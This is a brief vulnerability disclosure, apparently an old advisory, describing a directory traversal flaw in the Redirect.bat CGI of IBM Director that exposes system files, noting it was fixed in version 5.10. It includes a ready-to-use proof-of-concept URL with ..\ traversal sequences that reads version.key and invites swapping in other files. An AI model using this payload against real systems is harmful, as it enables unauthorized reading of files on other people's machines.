There is a vulnerability within the Redirect.bat file on a ibm director
cgi which allows a directory transversal to take place which in turn
exposes most files on the system to be read without authorization.

http://ip.of.system:411/cgi-bin/Redirect.bat?file=%7C..\..\..\..\..\..\....\..\program%20files\ibm\director\version.key (or insert evil file here)


This was fixed in the 5.10 version of ibm director.
